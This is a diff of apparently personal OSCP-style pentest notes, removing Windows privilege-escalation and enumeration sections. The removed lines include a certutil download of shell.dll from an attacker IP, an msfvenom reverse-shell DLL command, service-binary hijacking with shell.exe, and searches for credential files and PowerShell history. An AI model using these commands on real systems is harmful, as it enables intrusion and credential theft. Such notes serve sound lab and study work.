@@ -83,9 +83,6 @@ gobuster dir -u http://192.168.121.122 -w /usr/share/wordlists/dirbuster/directo
 gobuster dir -u https://192.168.249.140/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,md,php,asp,aspx -t 99 2>/dev/null
 ```
 
-```jsx
-nikto -h http://192.168.121.122
-```
 
 Abuse webdav with cadavr:
 
@@ -740,66 +737,28 @@ root2:{HASH}:0:0:root:/root:/bin/bash
 
 [Windows Local Privilege Escalation | HackTricks | HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
 
-### Users | Groups
 
-```jsx
-whoami
-whoami /priv
-whoami /groups
-net user
-Get-LocalUser
-net user steve
-Get-LocalUser steve
-net group
-Get-LocalGroup
-Get-LocalGroupMember Administrators
-net localgroup administrators
-```
 
 ### System
 
 ```jsx
-systeminfo
-hostname
+
+
 ipconfig
 Get-ADdomain
 netstat -a
-tree \users\ /f /a
+
 ```
 
-### PowerShell history
 
-```jsx
-Get-History
-(Get-PSReadlineOption).HistorySavePath
-type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-type C:\Users\Lance.Rubens\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-```
 
 ### Enumeration Files | Services | Tasks
 
-```jsx
-Get-ChildItem Env: | ft Key,Value
+
+
 ```
 
-```jsx
-Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.kdbx,*.log -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-```
 
-```jsx
-Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
-
-icacls "C:\Program Files\MilleGPG5\GPGService.exe"
-stop-service GPGOrchestrator
-copy shell.exe "C:\Program Files\MilleGPG5\GPGService.exe"
-start-service GPGOrchestrator
-
-sc.exe qc VeyonService
-move veyon-service.exe veyon-service.bak
-move shell64.exe veyon-service.exe
-shutdown /r /t 0
-```
 
 ```jsx
 schtasks /query /fo LIST /v | Select-String -Pattern "TaskName:"
@@ -836,17 +795,6 @@ Restart-Service -Name 'mysql'
 shutdown /r /t 0
 ```
 
-### PATH & ENV
-
-```jsx
-get-childitem env:
-```
-
-```jsx
-echo %PATH%
-get-childitem env:path | Format-List *
-certutil -urlcache -split -f http://192.168.45.214/shell.dll C:\Users\emma\AppData\Local\Microsoft\WindowsApps\BetaLibrary.Dll
-```
 
 ### AlwaysInstallElevated
 
@@ -938,29 +886,8 @@ runas /user:oscp\bernie cmd.exe
 
 It is important so the payload will be correct arch. Use this powershell script:
 
-```jsx
-Add-Type -MemberDefinition @'
-[DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
-[return: MarshalAs(UnmanagedType.Bool)]
-public static extern bool IsWow64Process(
-    [In] System.IntPtr hProcess,
-    [Out, MarshalAs(UnmanagedType.Bool)] out bool wow64Process);
-'@ -Name NativeMethods -Namespace Kernel32
 
-Get-Process "FJTWSVIC" | Foreach {
-    $is32Bit=[int]0 
-    if ([Kernel32.NativeMethods]::IsWow64Process($_.Handle, [ref]$is32Bit)) { 
-        "$($_.Name) $($_.Id) is $(if ($is32Bit) {'32-bit'} else {'64-bit'})" 
-    } 
-    else {"IsWow64Process call failed"}
 
-```
-
-so the payload which we generate will be x86:
-
-```jsx
-msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=192.168.45.213 LPORT=443
-```
 
 ### Got shitty cmd shell?
 
